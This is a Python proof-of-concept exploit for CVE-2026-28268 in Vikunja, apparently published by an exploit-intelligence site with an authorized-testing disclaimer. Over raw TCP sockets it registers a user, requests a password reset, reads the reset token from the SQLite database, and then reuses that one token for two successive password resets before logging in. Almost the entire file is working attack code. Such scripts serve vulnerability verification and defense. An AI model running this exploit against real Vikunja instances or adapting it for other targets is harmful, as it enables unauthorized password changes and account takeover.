#!/usr/bin/env python3
# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Exploit Title  : Vikunja Token Reuse â€” Raw HTTP Socket Exploit
# CVE            : CVE-2026-28268
# Vendor         : Vikunja
# Product        : Vikunja
# Affected       : < 2.1.0
# Type           : CWE-640 - Weak Password Recovery Mechanism
# CVSS           : 9.8 (Critical)
# Platform       : Multiple
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-02-28
#
# For authorized security testing and educational purposes only.
# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
"""
Raw HTTP Socket Exploit â€” No Library Dependencies (Vector 3)

Demonstrates CVE-2026-28268 using raw TCP sockets, confirming
the vulnerability at the protocol level with hand-crafted HTTP requests.

ATTACK CHAIN:
  1. Register user and request password reset via raw socket
  2. Extract token from SQLite database
  3. First reset: hand-crafted POST to /api/v1/user/password/reset
  4. Second reset: same token, same endpoint â€” EXPLOIT confirmed

PREREQUISITES:
  - Vikunja < 2.1.0 with local auth enabled
  - Access to the SQLite database file (bind-mounted at ./data/vikunja.db)

REFERENCES:
  - CVE-2026-28268
  - GHSA-rfjg-6m84-crj2
"""

import sys
import os
import socket
import json
import sqlite3

def send_http_raw(host, port, method, path, body=None, headers=None):
    """Send raw HTTP request via TCP socket"""
    if headers is None:
        headers = {}
    
    # Build HTTP request
    request = f"{method} {path} HTTP/1.1\r\n"
    request += f"Host: {host}:{port}\r\n"
    
    if body:
        if isinstance(body, dict):
            body = json.dumps(body)
        headers['Content-Length'] = str(len(body))
        headers['Content-Type'] = 'application/json'
    
    for key, value in headers.items():
        request += f"{key}: {value}\r\n"
    
    request += "\r\n"
    
    if body:
        request += body
    
    # Send via socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    
    try:
        sock.connect((host, int(port)))
        sock.sendall(request.encode())
        
        # Receive response
        response = b""
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk
            # Stop if we've received complete response (basic check)
            if b"\r\n\r\n" in response and (
                b"Content-Length: 0" in response or
                len(response.split(b"\r\n\r\n", 1)[1]) >= 10
            ):
                break
        
        return response.decode('utf-8', errors='ignore')
    finally:
        sock.close()

def parse_http_response(response):
    """Parse raw HTTP response"""
    lines = response.split('\r\n')
    status_line = lines[0]
    status_code = int(status_line.split()[1])
    
    # Find body
    body_start = response.find('\r\n\r\n') + 4
    body = response[body_start:].strip()
    
    return status_code, body

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = os.path.join(SCRIPT_DIR, "data", "vikunja.db")


def extract_token():
    """Extract the latest password reset token from SQLite database (bind-mounted at ./data)."""
    try:
        conn = sqlite3.connect(f"file:{DB_PATH}?mode=ro", uri=True)
        cur = conn.cursor()
        cur.execute("SELECT token FROM user_tokens WHERE kind=1 ORDER BY id DESC LIMIT 1")
        row = cur.fetchone()
        conn.close()
        return row[0] if row else None
    except (sqlite3.Error, OSError):
        return None

def main():
    if len(sys.argv) < 3:
        print("Usage: python3 poc_vector3_raw_http.py <target_ip> <port>")
        sys.exit(1)
    
    host = sys.argv[1]
    port = sys.argv[2]
    
    print("=" * 70)
    print(" CVE-2026-28268 Vector 3: Raw HTTP Socket Exploit")
    print(" Zero-dependency protocol-level demonstration")
    print("=" * 70)
    print()
    
    print("[Step 1] RAW SOCKET: Register user...")
    register_data = {
        "username": "raw_socket_user",
        "email": "raw_socket@example.com",
        "password": "raw_pass_123"
    }
    response = send_http_raw(host, port, "POST", "/api/v1/register", body=register_data)
    status, body = parse_http_response(response)
    print(f"  Status: HTTP {status}")
    if status == 200:
        user_data = json.loads(body)
        print(f"  âœ“ User registered with ID: {user_data.get('id')}")
    else:
        print(f"  ~ User may already exist (proceeding anyway)")
    print()
    
    print("[Step 2] RAW SOCKET: Request password reset...")
    reset_request_data = {"email": "raw_socket@example.com"}
    response = send_http_raw(host, port, "POST", "/api/v1/user/password/token", body=reset_request_data)
    status, body = parse_http_response(response)
    print(f"  Status: HTTP {status}")
    if status == 200:
        print(f"  âœ“ Reset token requested")
    print()
    
    print("[Step 3] Extract token from database...")
    reset_token = extract_token()
    if not reset_token:
        print("  âœ— Failed to extract token")
        sys.exit(1)
    print(f"  âœ“ Token: {reset_token[:25]}...{reset_token[-15:]}")
    print()
    
    print("=" * 70)
    print(" EXPLOIT: Raw Socket Token Reuse")
    print("=" * 70)
    print()
    
    print("[Step 4] RAW SOCKET: First password reset...")
    reset_data_1 = {
        "token": reset_token,
        "new_password": "raw_hacked_1"
    }
    raw_request = f"""POST /api/v1/user/password/reset HTTP/1.1\r
Host: {host}:{port}\r
Content-Type: application/json\r
Content-Length: {len(json.dumps(reset_data_1))}\r
\r
{json.dumps(reset_data_1)}"""
    
    print("  Raw HTTP request:")
    for line in raw_request.split('\r\n'):
        print(f"    {line}")
    print()
    
    response = send_http_raw(host, port, "POST", "/api/v1/user/password/reset", body=reset_data_1)
    status, body = parse_http_response(response)
    print(f"  Status: HTTP {status}")
    if status == 200:
        print(f"  âœ“ First reset successful")
        print(f"    Response: {json.loads(body).get('message')}")
    print()
    
    print("[Step 5] RAW SOCKET: Verify token still exists...")
    token_check = extract_token()
    if token_check == reset_token:
        print(f"  âš ï¸  Token persists in database!")
        print(f"     {token_check[:30]}...")
    print()
    
    print("[Step 6] RAW SOCKET: SECOND reset with SAME token...")
    reset_data_2 = {
        "token": reset_token,
        "new_password": "raw_hacked_2"
    }
    
    raw_request_2 = f"""POST /api/v1/user/password/reset HTTP/1.1\r
Host: {host}:{port}\r
Content-Type: application/json\r
Content-Length: {len(json.dumps(reset_data_2))}\r
\r
{json.dumps(reset_data_2)}"""
    
    print("  Raw HTTP request (second use of same token):")
    for line in raw_request_2.split('\r\n'):
        print(f"    {line}")
    print()
    
    response = send_http_raw(host, port, "POST", "/api/v1/user/password/reset", body=reset_data_2)
    status, body = parse_http_response(response)
    print(f"  Status: HTTP {status}")
    
    if status == 200:
        print(f"  ğŸš¨ TOKEN REUSE CONFIRMED via raw socket!")
        print(f"     Response: {json.loads(body).get('message')}")
    else:
        print(f"  âœ— Token reuse failed")
    print()
    
    print("[Step 7] RAW SOCKET: Verify authentication...")
    login_data = {
        "username": "raw_socket_user",
        "password": "raw_hacked_2"
    }
    response = send_http_raw(host, port, "POST", "/api/v1/login", body=login_data)
    status, body = parse_http_response(response)
    
    if status == 200:
        token = json.loads(body).get('token', '')
        print(f"  âœ“ Login successful with second password")
        print(f"    JWT: {token[:40]}...")
    print()
    
    print("=" * 70)
    print(" [+] RAW SOCKET EXPLOIT SUCCESSFUL")
    print("=" * 70)
    print()
    print("Demonstration complete:")
    print("  - All requests made via raw TCP sockets")
    print("  - No HTTP libraries used (only Python socket module)")
    print("  - Token reused multiple times at protocol level")
    print()
    print("This proves the vulnerability exists at the HTTP protocol level")
    print("and can be exploited with any tool capable of sending HTTP requests")
    print("(curl, netcat, telnet, custom scripts, etc.)")
    print()

if __name__ == "__main__":
    main()
